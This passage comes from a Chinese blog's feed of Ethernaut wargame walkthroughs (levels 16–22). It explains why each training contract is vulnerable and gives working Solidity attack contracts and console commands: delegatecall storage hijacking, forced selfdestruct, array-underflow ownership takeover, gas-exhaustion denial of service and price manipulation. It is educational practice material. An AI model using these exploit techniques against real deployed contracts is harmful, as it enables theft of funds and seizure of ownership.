storage)。</p></li><li><p>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</p></li><li><p>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。</p></li></ul><p>考虑以下因素：</p><ol><li>Preservation 调用 setTime 的时候，修改的是 Preservation 的存储空间，而非 LibraryContract 的。</li><li>setTime 执行的时候，会对 uint 类型的 storedTime 赋值，这实际意味着对存储空间中的 slot 0 进行赋值。</li><li>Preservation 存储空间中 slot 0 存储的是 timeZone1Library，也就是调用 setTime 将会导致 timeZone1Library 被修改。</li></ol><p>综合以上 3 点，我们可以将 timeZone1Library 替换为攻击合约。攻击合约沿用上面的思路，构建一个新的 LibraryContract，该合约在调用 setTime 的时候，会修改存储空间中 slot 2 的值（Preservation 的 slot 2 存储的是 owner）。攻击合约如下：</p><pre><code>pragma solidity ^0.4.25;contract PreservationPoc {  address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  function setTime(uint _time) public {    owner = address(_time);  }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141318817.png"></p><p>2、在remix中部署恶意合约<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141430175.png">3、在控制台执行一下命令：（恶意合约地址就在部署那里)<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729142638892.png"></p><pre><code>await contract.setSecondTime('恶意合约地址')await contract.setFirstTime('player地址')</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141749245.png"></p><p>4、这时候合约的拥有者就成了我们自己</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141818990.png"></p><p>5、快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729141942972.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Recovery第17关练习</title>
      <link href="//Ethernaut/Ethernaut/17.Ethernaut-Recovery/"/>
      <url>//Ethernaut/Ethernaut/17.Ethernaut-Recovery/</url>
      
        <content type="html"><![CDATA[<h1 id="Recovery第17关练习"><a href="#Recovery第17关练习" class="headerlink" title="Recovery第17关练习"></a>Recovery第17关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。</p><p>找出目标合约生成的代币合约，并取出里面的 ETH</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Recovery {  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public {    new SimpleToken(_name, msg.sender, _initialSupply);    }}contract SimpleToken {  using SafeMath for uint256;  // public variables  string public name;  mapping (address =&gt; uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) public {    name = _name;    balances[_creator] = _initialSupply;  }  // collect ether in return for tokens  fallback() external payable {    balances[msg.sender] = msg.value.mul(10);  }  // allow transfers of tokens  function transfer(address _to, uint _amount) public {     require(balances[msg.sender] &gt;= _amount);    balances[msg.sender] = balances[msg.sender].sub(_amount);    balances[_to] = _amount;  }  // clean up after ourselves  function destroy(address payable _to) public {    selfdestruct(_to);  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>由于在链上所有东西都是透明的，因此合约创建时我们直接查看合约就可以查看到新建立的合约的地址。直接去 Etherscan 找 instance 的交易记录，可以很容易找到代币合约，然后调用其 destroy 函数即可。之后如果要回复token可以借助destory函数来实现，可以构建如下EXP:</p><pre><code>pragma solidity ^0.4.23;contract SimpleToken {  // public variables  string public name;  mapping (address =&gt; uint) public balances;  // collect ether in return for tokens  function() public payable ;  // allow transfers of tokens  function transfer(address _to, uint _amount) public ;  // clean up after ourselves  function destroy(address _to) public ;}contract RecoveryPoc {    SimpleToken target;    constructor(address _addr) public{        target = SimpleToken(_addr);    }    function attack() public{        target.destroy(tx.origin);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看合约地址<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729155044314.png"></p><p>2、在meta mask中从etherscan中查看刚刚获取实例时的合约交互，查看Internal Txns</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729155324299.png"></p><p>3、可以观察发现我们的帐户给了他 1 ether，然后他又给了另一个地址 0.5 ether，这就是新创建的合约的地址，我们只需要调用新建的这个合约的 destory。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729155734056.png"></p><p>4、在remix中部署RecoveryPoc，将新地址复制出来</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729155929557.png"></p><p>5、点击attack，查看交易详情<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729160509825.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729160521312.png"></p><p>6、有看到TRANSFER和SELF DESTRUCT，新合约把0.5的eth退还给我们，同时开启了自毁程序<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729160858305.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729160736478.png"></p><p>7、冲冲冲，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729161043983.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MagicNumber第18关练习</title>
      <link href="//Ethernaut/Ethernaut/18.Ethernaut-MagicNumber/"/>
      <url>//Ethernaut/Ethernaut/18.Ethernaut-MagicNumber/</url>
      
        <content type="html"><![CDATA[<h1 id="MagicNumber第18关练习"><a href="#MagicNumber第18关练习" class="headerlink" title="MagicNumber第18关练习"></a>MagicNumber第18关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>为了解决这个问题，你只需要为以太坊提供一个“Solver”，一个用正确数字响应“whatIsTheMeaningOfLife()”的合约。</p><p>容易吧？嗯……有一个问题。</p><p>求解器的代码需要非常小。真的好小。就像 freakin’ 真的非常非常小：最多 10 个操作码。</p><p>提示：也许是时候暂时离开 Solidity 编译器的舒适区，并手动构建这个 O_o。没错：原始 EVM 字节码。</p><p>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract MagicNum {  address public solver;  constructor() public {}  function setSolver(address _solver) public {    solver = _solver;  }  /*    ____________/\\\_______/\\\\\\\\\_____             __________/\\\\\_____/\\\///////\\\___             ________/\\\/\\\____\///______\//\\\__             ______/\\\/\/\\\______________/\\\/___             ____/\\\/__\/\\\___________/\\\//_____             __/\\\\\\\\\\\\\\\\_____/\\\//________             _\///////////\\\//____/\\\/___________             ___________\/\\\_____/\\\\\\\\\\\\\\\_             ___________\///_____\///////////////__  */}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>先看这个</p><ul><li>参考<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium</a></li><li>参考 <a href="https://f3real.github.io/Ethernaut_wargame19.html">https://f3real.github.io/Ethernaut_wargame19.html</a></li></ul><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729163906130.png"></p><ul><li>图片来自于<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</a></li></ul><p>先看一下 <strong>contract creation</strong> 期间会发生什么：<br>1、首先，用户或合约将交易发送到以太网网络。此交易包含数据，但没有 <code>to</code> 地址，表明这是一个合约创建，而不是一个 <code>send/call transaction</code><br>2、其次，<code>EVM</code> 将 <code>Solidity</code>（高级语言）的合约代码编译为 <strong>bytecode</strong>（底层的机器语言），该 <strong>bytecode</strong> 直接转换为 <strong>opcodes</strong> ，在单个调用堆栈中运行</p><p>需要注意的是：<strong>contract creation</strong> 的 <strong>bytecode</strong> 包含两部分：<code>initialization code</code> 和 <code>runtime code</code></p><p>3、在 <strong>contract creation</strong> 期间，<code>EVM</code> 仅执行 <code>initialization code</code> 直到到达堆栈中的第一条 <strong>STOP</strong> 或 <strong>RETURN</strong> 指令，在此阶段，合约的 <code>constructor()</code> 会被运行，合约便有地址了</p><p>在运行 <code>initialization code</code> 后，只有 <code>runtime code</code> 在堆栈上，然后将这些 <strong>opcode</strong> <strong>拷贝</strong> 到 <code>memory</code> 并返回到 <code>EVM</code></p><p>4、最后，<code>EVM</code> 将 <code>runtime code</code> 返回的 <strong>opcode</strong> 存储在 <code>state storage</code> ，并与新的合约地址相关联，在将来对新合约的调用时，这些 <code>runtime code</code> 将被执行</p><ul><li><p>所以为了解决该题，我们需要<code>initialization opcodes</code>和<code>runtime codes</code></p></li><li><p><code>initialization opcodes</code>: 由 <code>EVM</code> 运行创建合约并存储将来要用的 <code>runtime codes</code></p></li><li><p><code>runtime codes</code>: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 <strong>return 42</strong> 并且 <strong>under 10 opcodes</strong></p></li></ul><p>1、先来看 <code>runtime codes</code> :</p><ul><li><p>返回值由 <strong>return(p, s)</strong> 操作码处理，但是在返回值之前，必须先存储在内存中，使用 <strong>mstore(p, v)</strong> 将 <strong>42</strong> 存储在内存中</p><ul><li><p>首先，使用 <strong>mstore(p, v)</strong> 将 <strong>42</strong> 存储在内存中，其中 <code>p</code> 是在内存中的存储位置， <code>v</code> 是十六进制值，<strong>42</strong> 的十六进制是 <strong>0x2a</strong></p><pre><code>0x602a     ;PUSH1 0x2a                  v0x6080     ;PUSH1 0x80                  p0x52       ;MSTORE</code></pre></li><li><p>然后，使用 <strong>return(p, s)</strong> 返回 <strong>0x2a</strong> ，其中 <code>p</code> 是值 <strong>0x2a</strong> 存储的位置，<code>s</code> 是值 <strong>0x2a</strong> 存储所占的大小 <code>0x20</code> ，占32字节</p><pre><code>0x6020     ;PUSH1 0x20                  s0x6080     ;PUSH1 0x80                  p0xf3       ;RETURN</code></pre></li></ul></li><li><p>所以 <code>runtime codes</code> 应该是 <strong>602a60805260206080f3</strong> ，正好 <strong>10 opcodes</strong></p></li></ul><p>2、再来看 <code>initialization codes</code> :</p><ul><li><p>首先，<code>initialization codes</code> 需要先将 <code>runtime codes</code> 拷贝到内存，然后再将其返回到 <code>EVM</code> 。将代码从一个地方复制到另一个地方是 <strong>codecopy(t, f, s)</strong> 操作码。<strong>t</strong> 是代码的目标位置，<strong>f</strong> 是 <code>runtime codes</code> 的当前位置，<strong>s</strong> 是代码的大小，以字节为单位，对于 <strong>602a60805260206080f3</strong> 就是 <strong>10 bytes</strong></p><pre><code>;copy bytecode to memory0x600a     ;PUSH1 0x0a                      S(runtime code size)0x60??     ;PUSH1 0x??                      F(current position of runtime opcodes)0x6000     ;PUSH1 0x00                      T(destination memory index 0)0x39       ;CODECOPY</code></pre></li><li><p>然后，需要将内存中的 <strong>runtime codes</strong> 返回到 <code>EVM</code></p><pre><code>;return code from memory to EVM0x600a     ;PUSH1 0x0a                      S0x6000     ;PUSH1 0x00                      P0xf3       ;RETURN</code></pre></li><li><p><code>initialization codes</code> 总共占了 <strong>0x0c</strong> 字节，这表示 <code>runtime codes</code> 从索引 <strong>0x0c</strong> 开始，所以 <strong>??</strong> 的地方是 <strong>0x0c</strong></p></li><li><p>所以，<code>initialization codes</code> 最后的顺序是 <strong>600a600c600039600a6000f3</strong></p></li></ul><p><strong>所以，opcodes最后的顺序是 0x600a600c600039600a6000f3602a60805260206080f3</strong></p><p>对于操作码的执行我们需要用转账函数：</p><pre><code>web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)})</code></pre><p>然后点击查看新合约地址，得到 <code>Contract address</code>，再调用合约中的setSolver(“新合约地址”);就可以了</p><p>最终攻击代码如下：</p><pre><code>var bytecode = "0x600a600c600039600a6000f3602A60805260206080f3"; web3.eth.sendTransaction({from:player, data:bytecode}, function(err,res){console.log(res)}); // 通关 Etherscan 得到合约地址 contractAddressawait contract.setSolver("新的合约地址");</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，将代码输入<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729164357851.png"></p><p>2、执行操作码转账函数<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729164534762.png"></p><p>3、在etherscan上找到新合约地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729164726524.png">4、调用函数，冲！提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729165249626.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729165259337.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alien Codex第19关练习</title>
      <link href="//Ethernaut/Ethernaut/19.Ethernaut-Alien%20Codex/"/>
      <url>//Ethernaut/Ethernaut/19.Ethernaut-Alien%20Codex/</url>
      
        <content type="html"><![CDATA[<h1 id="Alien-Codex第19关练习"><a href="#Alien-Codex第19关练习" class="headerlink" title="Alien Codex第19关练习"></a>Alien Codex第19关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>获取合约的所有权</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import '../helpers/Ownable-05.sol';contract AlienCodex is Ownable {  bool public contact;//布尔型变量contact  bytes32[] public codex;  modifier contacted() {    assert(contact);    _;//函数修饰符,要通过contact必须要是true  }    function make_contact() public {    contact = true;//可以通过这个函数,使得contact变为true  }  function record(bytes32 _content) contacted public {      codex.push(_content);  }//增加数组长度  function retract() contacted public {    codex.length--;  }//减少数组长度  function revise(uint i, bytes32 _content) contacted public {    codex[i] = _content;  }//修改数组里的内容}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>该合约的 owner 字段定义在 Ownable 中，存储在 slot 0，我们的目标就是替换 slot 0 中的数据。<br>注意以下几点：</p><ol><li>目标合约定义了一个叫 codex 的 bytes32[] 类型的数组，我们可以向该数组中添加/修改数据，还可以修改数组的长度</li><li>在 Solidity 中，插槽数组大小为 2**256，codex 中的元素为 bytes32 类型，所以一个元素会占据一个 slot</li><li>在 Solidity 中，(2**256 - 1) + 1 = 0</li><li>各个字段在 Storage 中的布局：</li></ol><pre><code>address _owner: slot 0, 20 bytesbool contact: slot 0, 8 byteslength of codex: slot 1, 32 bytescodex elements: start from slot keccak256(1)</code></pre><p>综合这些信息不难想到，我们可以通过让 codex 溢出来访问到 slot 0。Storage 的情况可以使用 remix 的 Debug 功能来观察、验证。</p><p>具体的攻击步骤如下：</p><pre><code>contract.make_contact()contract.retract() // 该步骤使得 codex.length 溢出，codex.length == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff// codex 的第一个元素应该位于 keccak256(abi.encodePacked(1)) == 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，该 slot 到 slot 0 的距离为:// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1// 结果为 35707666377435648211887908874984608119992236509074197713628505308453184860938contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000000·34DC7d4F5E3512B66271Ce64198c20DFD8B53897这里替换玩家的地址·') // 注意 player 需要添加前置 0，因为 address 是 20 bytes，而 slot 0 存储 32 bytes</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729174306504.png"></p><p>2、调用make_contact函数<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729174317923.png"></p><p>3、调用retract函数</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729174635571.png"></p><p>4、使用revise函数让owner变成玩家自己，检查结果<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729174710579.png"></p><p>5、快乐提交<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729174809827.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Denial第20关练习</title>
      <link href="//Ethernaut/Ethernaut/20.Ethernaut-Denial/"/>
      <url>//Ethernaut/Ethernaut/20.Ethernaut-Denial/</url>
      
        <content type="html"><![CDATA[<h1 id="Denial第20关练习"><a href="#Denial第20关练习" class="headerlink" title="Denial第20关练习"></a>Denial第20关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>目标：造成 DOS 使得合约的 owner 在调用 withdraw 时无法正常提取资产</p><p>要求就是在调用 <code>withdraw</code> 时，禁止 <code>owner</code> 转走账户的 <code>1%</code> 的余额</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Denial {    using SafeMath for uint256;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address payable public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public {        partner = _partner;    }    // withdraw 1% to recipient and 1% to owner    function withdraw() public {        uint amountToSend = address(this).balance.div(100);        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call.value(amountToSend)("");        owner.transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = now;        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);    }    // allow deposit of funds    fallback() external payable {}    // convenience function    function contractBalance() public view returns (uint) {        return address(this).balance;    }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p><ul><li>可以使 <code>transfer</code> 失败，也就是把 <code>gas</code> 耗光</li><li>使用 <code>assert</code> 失败的话，将会 <code>spend all gas</code> ，这样的话 <code>owner.transfer(amountToSend)</code> 将执行失败</li><li>这里还有一个很明显的重入漏洞 <code>partner.call.value(amountToSend)()</code> ，利用重入漏洞把 <code>gas</code> 消耗完，应该也可以达到目的</li></ul><p>主要思路是，让合约在执行时消耗完所有 gas，交易失败。所以我们可以构建这样的攻击合约</p><p>顺带提一下把gas耗光的情况，assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p><pre><code>pragma solidity ^0.4.23;contract Denial {    address public partner;    address public constant owner = 0xA9E;    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances;     function setWithdrawPartner(address _partner) public {        partner = _partner;    }    function withdraw() public {        uint amountToSend = address(this).balance/100;        partner.call.value(amountToSend)();        owner.transfer(amountToSend);        timeLastWithdrawn = now;        withdrawPartnerBalances[partner] += amountToSend;    }    function() payable {}    function contractBalance() view returns (uint) {        return address(this).balance;    }}contract Attack{    address instance_address = 题目合约地址;    Denial target = Denial(instance_address);    function hack() public {        target.setWithdrawPartner(address(this));        target.withdraw();    }    function () payable public {        assert(0==1);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729175502369.png"></p><p>2、部署合约，复制合约中的地址</p><pre><code>pragma solidity ^0.4.23;contract Denial {    address public partner;    address public constant owner = 0xA9E;    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances;     function setWithdrawPartner(address _partner) public {        partner = _partner;    }    function withdraw() public {        uint amountToSend = address(this).balance/100;        partner.call.value(amountToSend)();        owner.transfer(amountToSend);        timeLastWithdrawn = now;        withdrawPartnerBalances[partner] += amountToSend;    }    function() payable {}    function contractBalance() view returns (uint) {        return address(this).balance;    }}contract Attack{    address instance_address = 题目合约地址;    Denial target = Denial(instance_address);    function hack() public {        target.setWithdrawPartner(address(this));        target.withdraw();    }    function () payable public {        target.withdraw();    } }</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729175615378.png"></p><p>3、编译运行，直接hack</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729175745251.png"></p><p>4、直接提交就行</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729175823203.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shop第21关练习</title>
      <link href="//Ethernaut/Ethernaut/21.Ethernaut-Shop/"/>
      <url>//Ethernaut/Ethernaut/21.Ethernaut-Shop/</url>
      
        <content type="html"><![CDATA[<h1 id="Shop第21关练习"><a href="#Shop第21关练习" class="headerlink" title="Shop第21关练习"></a>Shop第21关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>实现一个函数，使得两次调用返回值不同</p><p>要求是修改 price 低于 100，<br>        那就第一次返回大于100，第二次返回小于100。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Buyer {  function price() external view returns (uint);}contract Shop {  uint public price = 100;  bool public isSold;  function buy() public {    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) {      isSold = true;      price = _buyer.price.gas(3000)();    }  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>本关原理跟11. Elevator相差不大，关卡合約中分別呼叫了两次Buyer合约的price函数，只要第二次呼叫回传的数字比第一次呼叫回传的数字小即可。</p><p>本来想的是利用 <code>storage</code> 修改，可是修改变量需要 <strong>5000 gas</strong>，但是关卡合约使用call呼叫price函数是自定义了一个非常少的gas，只有 <strong>3000</strong>，这个数量不足以更改任何Storage的数值。</p><p>观察合约，可以发现两次请求price函数中间有这个代码︰</p><pre><code>isSold = true;</code></pre><p>因此我们可以利用isSold数值的转变在price函数时候传不同的数字。<code>isSold</code> 是 <code>public</code> 属性，所以可以利用 <code>isSold</code> ，根据 <code>isSold</code> 进行判断，两次调用 <code>_buyer.price.gas(3000)()</code> 第一次返回大于等于 <code>100</code> ，第二次返回小于 <code>100</code> 即可</p><p>因为gas数量实在是太低了，Solidity 0.8有可能会因为版本原因导致gas使用完而失败，因此以下采用Solidity 0.7进行编写。</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看合约地址，是否卖出，价格</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729192854086.png"></p><p>2、部署合约，复制地址</p><pre><code>pragma solidity ^0.5.0;interface Buyer {  function price() external view returns (uint);}contract Shop {  uint public price = 100;  bool public isSold;  function buy() public {    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) {      isSold = true;      price = _buyer.price.gas(3000)();    }  }}interface IShop {    function isSold() external view returns (bool);    function buy() external;}contract ShopAttack {    address levelInstance;    constructor(address _levelInstance) public {        levelInstance = _levelInstance;    }    function price() public view returns (uint256) {        return IShop(msg.sender).isSold() ? 0 : 100;    }    function buy() public {        IShop(levelInstance).buy();    }}</code></pre><p>3、编译执行攻击合约，点击买下来，这里执行成功表示我们是满足了合约要求的3000gas，若不成功表示gas过大</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729193145097.png"></p><p>4、检查是否卖出，价格</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729193303333.png"></p><p>5、快乐提交吧！</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729193414532.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dex第22关练习（超详细图片版）</title>
      <link href="//Ethernaut/Ethernaut/22.Ethernaut-Dex/"/>
      <url>//Ethernaut/Ethernaut/22.Ethernaut-Dex/</url>
      
        <content type="html"><![CDATA[<h1 id="Dex第22关练习（超详细图片版）"><a href="#Dex第22关练习（超详细图片版）" class="headerlink" title="Dex第22关练习（超详细图片版）"></a>Dex第22关练习（超详细图片版）</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>这个级别的目标是让你破解下面的基本DEX合约，通过价格操纵窃取资金。</p><p>玩家最开始有10个Token1和10个Token2，DEX合同最开始有100个Token和100个Token2。</p><p>如果让两个Token至少1个被取光，即让至少一个Token为零，并知道这期间会有一个“报错”，您将在该级别获得成功。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import "@openzeppelin/contracts/token/ERC20/IERC20.sol";import "@openzeppelin/contracts/token/ERC20/ERC20.sol";import '@openzeppelin/contracts/math/SafeMath.sol';contract Dex  {  using SafeMath for uint;  address public token1;  address public token2;  constructor(address _token1, address _token2) public {    token1 = _token1;    token2 = _token2;  }  function swap(address from, address to, uint amount) public {//swap()函数 需要传入一个from地址，一个to地址，以及一个余额    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, "Not enough to swap");//先会判断玩家对应的from地址的值要&gt;=amount，不然不足以交换    uint swap_amount = get_swap_price(from, to, amount);//定义一个交换的余额值作为to的swap_amount,使用的方式是`get_swap_price`    IERC20(from).transferFrom(msg.sender, address(this), amount);//进行from地址的交换    IERC20(to).approve(address(this), swap_amount);//允许to地址的交换    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);//进行to地址的交换  }  function add_liquidity(address token_address, uint amount) public{    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  }  function get_swap_price(address from, address to, uint amount) public view returns(uint){    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));//通过from和to的地址对应的this(即instance)地址和amount值进行计算出并返回一个新的数值  }  function approve(address spender, uint amount) public {    SwappableToken(token1).approve(spender, amount);    SwappableToken(token2).approve(spender, amount);  }//允许合约地址进行交易  function balanceOf(address token, address account) public view returns (uint){    return IERC20(token).balanceOf(account);//查询对应token地址的余额  }}contract SwappableToken is ERC20 {  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {        _mint(msg.sender, initialSupply);  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>先了解一下：</p><ol><li><a href="https://en.wikipedia.org/wiki/Decentralized_exchange">Decentralized 